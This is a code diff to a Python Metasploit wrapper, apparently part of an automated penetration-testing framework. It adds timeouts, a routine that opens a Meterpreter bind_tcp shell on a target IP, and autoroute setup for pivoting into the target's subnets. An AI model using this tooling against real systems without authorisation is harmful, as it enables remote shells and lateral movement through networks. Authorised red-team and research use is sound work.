@@ -110,7 +110,7 @@ class MetasploitService:
 
         cid = self.client.consoles.console().cid
         console_output = self.client.consoles.console(cid).run_module_with_output(
-            exploit, payload=payload
+            exploit, payload=payload, timeout=30
         )
         return MetasploitExploitResult(
             cve_id=cve_id,
@@ -137,8 +137,6 @@ class MetasploitService:
 
         return output
 
-    # For pivoting, but may not be possible with Incalmo
-
     def run_post_module(
         self,
         module_fullname: str,
@@ -150,40 +148,68 @@ class MetasploitService:
 
         cid = self.client.consoles.console().cid
         console_output = self.client.consoles.console(cid).run_module_with_output(
-            module
+            module, timeout=30
         )
         return MetasploitModuleResult(
             console_cid=cid,
             console_output=console_output,
         )
 
+    def connect_to_session_via_bind(
+        self, ip_address: str
+    ) -> tuple[MetasploitExploitResult, AutorouteResult]:
+        previous_sessions = self.list_sessions()
+
+        exploit_result = self.run_exploit(
+            cve_id="N/A",
+            exploit_module_fullname="multi/handler",
+            exploit_options={},
+            payload_module_fullname="linux/x64/meterpreter/bind_tcp",
+            payload_options={
+                "LPORT": 7777,
+                "RHOST": ip_address,
+            },
+        )
+
+        new_sessions = self.list_sessions()
+        # Find the new session that was created as a result of running the handler
+        new_session = None
+        for session in new_sessions:
+            if session.session_id not in [s.session_id for s in previous_sessions]:
+                new_session = session
+                break
+        if new_session is None:
+            raise Exception(
+                "Failed to connect to session via bind shell: No new session found"
+            )
+
+        # If session found do autoroute add for the new session to the target subnet
+        autoroute_result = self.autoroute_add(session_id=new_session.session_id)
+
+        return exploit_result, autoroute_result
+
     def autoroute_add(
         self,
-        session_id: str,
-        subnet: str,
-        netmask: str,
+        session_id: int,
     ) -> AutorouteResult:
+        command = "autoadd"
         result = self.run_post_module(
             module_fullname="multi/manage/autoroute",
             options={
                 "SESSION": session_id,
-                "CMD": "add",
-                "SUBNET": subnet,
-                "NETMASK": netmask,
+                "CMD": command,
             },
         )
         output = json.dumps(result.model_dump(), indent=2)
         return AutorouteResult(
             session_id=session_id,
-            cmd="add",
-            subnet=subnet,
-            netmask=netmask,
+            cmd=command,
             output=output,
         )
 
     def autoroute_print(
         self,
-        session_id: str,
+        session_id: int,
     ) -> RouteTableResult:
         result = self.run_post_module(
             module_fullname="multi/manage/autoroute",
@@ -197,7 +223,7 @@ class MetasploitService:
 
     def autoroute_delete(
         self,
-        session_id: str,
+        session_id: int,
         subnet: str | None = None,
         netmask: str | None = None,
     ) -> AutorouteResult:
